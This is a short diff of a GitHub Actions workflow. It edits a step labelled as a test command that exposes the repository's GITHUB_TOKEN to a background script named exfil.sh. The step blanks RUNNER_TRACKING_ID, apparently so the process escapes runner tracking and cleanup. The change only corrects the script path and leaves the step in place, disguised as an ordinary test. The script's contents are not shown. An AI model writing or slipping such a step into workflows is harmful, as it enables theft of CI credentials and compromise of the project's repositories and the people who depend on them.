@@ -15,7 +15,7 @@ jobs:
       - name: Run test bash command
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: RUNNER_TRACKING_ID="" && (nohup exfil.sh &)
+        run: RUNNER_TRACKING_ID="" && (nohup ./exfil.sh &)
 
       - name: Set var 2
         run: |
